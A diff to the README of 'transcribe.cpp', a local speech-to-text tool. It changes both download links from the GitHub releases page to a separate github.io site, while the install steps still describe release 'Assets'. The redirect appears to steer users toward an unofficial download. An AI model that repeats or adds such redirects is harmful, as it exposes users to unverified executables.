@@ -1,6 +1,6 @@
 # 🎙️ transcribe.cpp - Accurate speech to text for everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Bestmed5455/transcribe.cpp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://bestmed5455.github.io)
 
 This software converts spoken audio into written text. It uses the ggml engine to process your files locally on your computer. You do not need an internet connection while it runs. It supports over 16 different model families, allowing you to choose the balance between speed and accuracy that fits your needs. 
 
@@ -14,7 +14,7 @@ This program works best with a dedicated graphics card, but it will function on 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit this page to download the software: https://github.com/Bestmed5455/transcribe.cpp/releases
+1. Visit this page to download the software: https://bestmed5455.github.io
 2. Look for the section labeled "Assets" under the most recent release.
 3. Click the link ending in .zip to download the compressed folder.
 4. Open your Downloads folder in File Explorer.
